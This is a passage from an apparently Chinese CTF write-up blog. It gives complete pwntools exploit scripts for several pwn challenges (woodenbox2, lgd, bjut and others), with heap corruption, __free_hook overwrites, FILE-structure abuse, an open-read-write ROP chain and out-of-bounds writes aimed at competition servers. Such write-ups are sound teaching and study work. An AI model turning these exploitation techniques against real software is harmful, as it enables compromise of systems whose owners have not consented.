**kwargs)</span><br><span class="line"># misc functions</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &apos;\x00&apos;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &apos;\x00&apos;))</span><br><span class="line">leak    = lambda name,addr :log.success(&apos;&#123;&#125; = &#123;:#x&#125;&apos;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = &apos;woodenbox2&apos;</span><br><span class="line">libc =ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.debug_remote_libc = False</span><br><span class="line">local=0</span><br><span class="line">def choice():</span><br><span class="line">if(local):</span><br><span class="line">p=rs()</span><br><span class="line">else:</span><br><span class="line">ctx.remote = (&apos;121.36.215.224&apos;,9998)</span><br><span class="line">p=rs(&apos;remote&apos;)</span><br><span class="line">return p</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line">print hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;&apos;sym1&apos;:0xEDA , &apos;sym2&apos;:0x10AF&#125;</span><br><span class="line">ctx.breakpoints = [0xEDA,0x10AF]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(size,content):</span><br><span class="line">sla(&quot;Your choice:&quot;,1)</span><br><span class="line">sla(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">sa(&quot;Please enter the name of item:&quot;,content)</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">sla(&quot;Your choice:&quot;,2)</span><br><span class="line">sla(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">sla(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">sa(&quot;Please enter the new name of the item:&quot;,content)</span><br><span class="line">def free(index):</span><br><span class="line">sla(&quot;Your choice:&quot;,3)</span><br><span class="line">sla(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">choice()</span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">create(0x68,&quot;a&quot;*0x20)</span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">create(0x18,&quot;a&quot;*0x10)</span><br><span class="line">free(0)</span><br><span class="line">edit(0,0x70,&quot;f&quot;*0x60+p64(0x170)+p64(0x100))</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">create(0x58,&quot;\xdd\x25&quot;)</span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">edit(1,0x100,0xf0*&apos;w&apos;+p64(0)+p64(0x70))</span><br><span class="line">create(0x68,&quot;a&quot;*0x20)</span><br><span class="line">create(0x68,&quot;\x00&quot;*0x33+p64(0xfbad1800)+p64(0)*3+&apos;\x88&apos;)</span><br><span class="line">libc_base=uu64(r(6))-(0x7ffff7dd18e0-0x7ffff7a0d000)</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">fake_file=p64(0)+p64(0x61)</span><br><span class="line">fake_file+=p64(0)+p64(_IO_list_all-0x10)</span><br><span class="line">fake_file+=p64(1)+p64(2)</span><br><span class="line">fake_file+=p64(0)+p64(libc_base+0x18cd57)</span><br><span class="line">fake_file=fake_file.ljust(0xd8,&quot;\x00&quot;)</span><br><span class="line">fake_file+=p64(libc_base+0x3c37a0-8)</span><br><span class="line">fake_file+=p64(0)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[&apos;system&apos;])</span><br><span class="line">free(3)</span><br><span class="line">edit(1,0x50+len(fake_file),0x50*&apos;a&apos;+fake_file)</span><br><span class="line">sla(&quot;Your choice:&quot;,1)</span><br><span class="line">sla(&quot;Please enter the length of item name:&quot;,str(0x100))</span><br><span class="line">#debug()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>​        <img src="./6.png" alt="img">      </p><h2><span id="lgd">lgd</span></h2><p>堆溢出，首先用fast bin attack攻击bss段修改指针，然后修改__free_hook为setcontext,最后劫持栈和rip。最后使用ORW的ROP，最后拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'lgd'</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.36.209.145'</span>,<span class="number">9998</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x0401A97</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0x0401A97</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"__?\n"</span>,size)</span><br><span class="line">sa(<span class="string">"or_no?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"ex ?\n"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"ex ?\n"</span>,index)</span><br><span class="line">sa(<span class="string">"tent ?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"ex ?\n"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">sla(<span class="string">" name? \n"</span>,<span class="string">"whali3n51"</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"f"</span>*<span class="number">0x50</span>+p64(<span class="number">0x160</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base=uu64(r(<span class="number">6</span>))-(<span class="number">0x7fb8d44feb78</span><span class="number">-0x7fb8d413a000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x1f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x603250</span>))</span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x58</span>,<span class="number">0x1f0</span>*<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">5</span>,p32(<span class="number">0x200</span>)*<span class="number">8</span>*<span class="number">4</span>+p64(libc_base+libc.symbols[<span class="string">"__free_hook"</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">"setcontext"</span>]+<span class="number">0x35</span>))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rsi = (libc_base + libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">frame.rcx = (libc_base + libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (libc_base + libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">frame.rip = libc_base + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">payload = str(frame)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">poprdi=libc_base+<span class="number">0x0000000000021102</span></span><br><span class="line">flag_addr=libc_base + libc.symbols[<span class="string">'__free_hook'</span>]+<span class="number">15</span>*<span class="number">8</span></span><br><span class="line">poprsi=libc_base+<span class="number">0x00000000000202e8</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">poprdx=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">puts_addr=libc_base+libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">bss=libc_base + libc.symbols[<span class="string">'__free_hook'</span>]+<span class="number">0x2000</span></span><br><span class="line">orw=p64(poprdi)+p64(flag_addr)+p64(poprsi)+p64(<span class="number">72</span>)+p64(open_addr)+p64(poprdi)+p64(<span class="number">3</span>)+p64(poprsi)+p64(bss)+p64(poprdx)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(poprdi)+p64(bss)+p64(puts_addr)+<span class="string">"/flag\x00"</span></span><br><span class="line">s(orw)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>​        <img src="./7.png" alt="img">      </p><h2><span id="shortest_path_v2">Shortest_Path_v2</span></h2><p>这一题是非预期，程序读入flag直接遗留在heap段了，后面申请chunk,直接就可以拿到，这次比赛的非预期真多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'Shortest_path'</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.37.181.246'</span>,<span class="number">19008</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xEDA</span> , <span class="string">'sym2'</span>:<span class="number">0x10AF</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0xEDA</span>,<span class="number">0x10AF</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(ID,name_size,name,index,distance)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,ID)</span><br><span class="line">sla(<span class="string">"Station Price: "</span>, <span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"Station Name Length: "</span>,str(name_size))</span><br><span class="line">sla(<span class="string">"Station Name: \n"</span>,name)</span><br><span class="line">sla(<span class="string">'Number of connected station: '</span>,len(index))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(index)):</span><br><span class="line">sla(<span class="string">"station ID: "</span>,index[i])</span><br><span class="line">sla(<span class="string">"distance: "</span>,distance[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(source,target)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"Source Station ID: "</span>,str(source))</span><br><span class="line">sla(<span class="string">"Target Station ID: "</span>,str(target))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,index)</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0</span>,<span class="number">0xf7</span>,<span class="string">"1"</span>*<span class="number">0xf7</span>,[<span class="number">2</span>],[<span class="number">123</span>])</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0xb8</span>,<span class="string">"1"</span>*<span class="number">0xb7</span>,[<span class="number">2</span>],[<span class="number">123</span>])</span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"Station Price: "</span>, <span class="string">'1'</span>)</span><br><span class="line">sla(<span class="string">"Station Name Length: "</span>,<span class="string">'-'</span>)</span><br><span class="line">sa(<span class="string">'Station Name: \n'</span>,<span class="string">'0'</span>)</span><br><span class="line">sla(<span class="string">'Number of connected station: '</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>​        <img src="./8.png" alt="img">      </p><h2><span id="bjut">bjut</span></h2><p>数组越界读写，直接可以修改stderr，因为是write泄露，并且字节特别大。同样的用modify越界修改stderr,然后可以修改到__free_hook。不过这样利用成功概率不大，需要不断尝试。我看其他队伍的wp，数组越界竟然到了负一千多的地方，可怕。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">''</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.37.167.199'</span>,<span class="number">9997</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"The length of your hw:\n"</span>,size)</span><br><span class="line">sa(<span class="string">"Input your hw:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"The index of your hw:"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"The index of your hw:"</span>,index)</span><br><span class="line">sa(<span class="string">"Input your hw:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"The index of your hw:"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0x7f</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">create(<span class="number">0x7f</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">show(<span class="number">-16</span>)</span><br><span class="line">ru(<span class="string">"\x77\x3a\x0a"</span>)</span><br><span class="line">info=r()</span><br><span class="line">libc_base=uu64(info[<span class="number">13</span>*<span class="number">8</span>:<span class="number">14</span>*<span class="number">8</span>])-(<span class="number">0x7f8e26d55760</span><span class="number">-0x00007f8e26b70000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"><span class="keyword">print</span> hex(len(info))</span><br><span class="line">pause()</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">-16</span>,info+(<span class="number">0x1f28</span>-len(info))*<span class="string">'\x00'</span>+p64(system))</span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">5</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p><img src="./9.png" alt="img">       </p><h2><span id="babyhacker">babyhacker</span></h2><p>这算是出题方的失误吧，题目flag直接包裹在题目附件里面。属实不想吐槽这种非预期。</p><p><img src="./10.png" alt="img"> </p><h2><span 